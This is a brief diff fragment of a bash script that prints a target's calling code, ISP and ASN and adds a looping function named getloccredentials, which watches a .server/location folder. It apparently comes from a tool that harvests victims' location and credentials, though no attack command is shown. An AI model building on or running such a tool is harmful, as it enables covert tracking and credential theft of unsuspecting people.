@@ -240,6 +240,10 @@ printf "  \e[0m\e[1;93m  Calling Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercallin
 printf "  \e[0m\e[1;93m  ISP           \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
 printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
 
+getloccredentials
+}
+getloccredentials() {
+
 while [ true ]; do
 
 if [[ -e .server/location/error.txt ]]; then
